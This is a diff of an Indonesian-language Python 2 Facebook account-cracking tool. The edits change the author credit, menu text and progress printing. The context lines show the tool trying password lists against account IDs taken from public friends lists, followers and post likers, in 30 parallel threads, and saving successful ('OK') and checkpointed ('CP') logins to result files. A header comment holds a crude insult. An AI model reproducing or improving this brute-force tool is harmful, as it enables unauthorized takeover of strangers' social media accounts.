@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by ROY-ID
-# my facebook ( https://www.facebook.com/jbfbold )
-# recode recode recode kontol bapak Lo pecah
+# code by ROY
+# my facebook ( https://www.facebook.com/JbFbOld )
+# no recode
 import os
 try:
     import requests
@@ -163,9 +163,9 @@ def moch_yayan():
     print ' [%s2%s] Crack dari Teman Publik'%(H,N)
     print ' [%s3%s] Crack dari Total Followers'%(H,N)
     print ' [%s4%s] Crack dari Like Postingan'%(H,N)
-    print ' [%s5%s] Mulai Crack'%(H,N)
-    print ' [%s6%s] Check informasi akun FB'%(H,N)
-    print ' [%s7%s] Lihat hasil Crack'%(H,N)
+    print ' [%s5%s] %sMulai Crack'%(H,N,H)
+    print ' %s[%s6%s] Cek Informasi Akun FB'%(N,H,N)
+    print ' [%s7%s] Cek Hasil Crack'%(H,N)
     print ' [%s8%s] Info %sSC ROY'%(H,N,H)
     print ' %s[%s0%s] Logout (%sHapus Token%s)'%(N,M,N,M,N)
     awokawokawokawokawokawokawokawokawokawokawokawok()
@@ -579,7 +579,7 @@ class __crack__:
                 else:
                 	
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
-                        cin = raw_input('\n [%s?%s] Pilihan Method Anda : '%(K,N))
+                        cin = raw_input('\n [%s?%s] Pilihan Method : '%(K,N))
                         if cin == '':
                             self.__yan__()
                         elif cin == '1':
@@ -657,7 +657,7 @@ class __crack__:
 
     def __api__(self, user, _yan_):
     	global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK:%s - CP:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\n\r [\x1b[1;96m***\x1b[0m] Crack : %s/%s OK:%s - CP:%s '%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -695,7 +695,7 @@ class __crack__:
         
     def __mbasic__(self, user, _yan_):
         global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK-:%s | CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\n\r [\x1b[1;96m***\x1b[0m] Crack : %s/%s OK-:%s | CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -732,7 +732,7 @@ class __crack__:
         
     def __mfb__(self, user, _yan_):
         global ok,cp,loop,tt
-        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK:%s | CP:%s '%(loop,len(self.id),len(ok),len(cp)),
+        print '\n\r [\x1b[1;96m***\x1b[0m] Crack : %s/%s OK:%s | CP:%s '%(loop,len(self.id),len(ok),len(cp)),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -771,15 +771,16 @@ class __crack__:
         loop += 1
         
     def __pler__(self):
-        yan = raw_input('\n [%s?%s] Pilihan Method Anda : '%(K,N))
+        yan = raw_input('\n [%s?%s] Pilihan Method : '%(K,N))
         if yan == '':
             self.__pler__()
         elif yan in ('1', '01'):
-            print '\n %s=================================================='%(N)
+            print ' %s=================================================='%(N)
             print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
             print ' %s=================================================='%(N)
-            print '\n [%s!%s] Matikan data selular untuk menjeda proses crack'%(M,N)
+            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
+            print ' %s=================================================='%(N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -815,11 +816,12 @@ class __crack__:
             hasil(ok,cp)
             exit()
         elif yan in ('2', '02'):
-            print '\n %s=================================================='%(N)
+            print ' %s=================================================='%(N)
             print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
             print ' %s=================================================='%(N)
-            print '\n [%s!%s] Matikan data selular untuk menjeda proses crack'%(M,N)
+            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
+            print ' %s=================================================='%(N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -855,11 +857,12 @@ class __crack__:
             hasil(ok,cp)
             exit()
         elif yan in ('3', '03'):
-            print '\n %s=================================================='%(N)
+            print ' %s=================================================='%(N)
             print ' [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H,N,ha, op, ta)
             print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K,N,ha, op, ta)
             print ' %s=================================================='%(N)
-            print '\n [%s!%s] Matikan data selular untuk menjeda proses crack'%(M,N)
+            print ' [%s!%s] %sMatikan data selular untuk menjeda proses crack'%(M,N,M)
+            print ' %s=================================================='%(N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
                 for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
